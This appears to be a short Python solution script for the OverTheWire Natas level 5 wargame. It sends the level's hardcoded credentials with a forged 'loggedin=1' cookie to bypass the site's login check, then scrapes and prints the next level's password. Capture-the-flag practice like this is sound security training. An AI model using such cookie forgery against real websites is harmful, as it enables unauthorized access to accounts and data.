from colorama.ansi import Fore
import requests
import re


url='http://natas5.natas.labs.overthewire.org'
username='natas5'
password='iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'
cookie={'loggedin':'1'}

website=requests.get(url,auth=(username,password),cookies=cookie)
print(Fore.MAGENTA + re.findall('natas6 is (.*)',website.text)[0].rstrip('</div>'))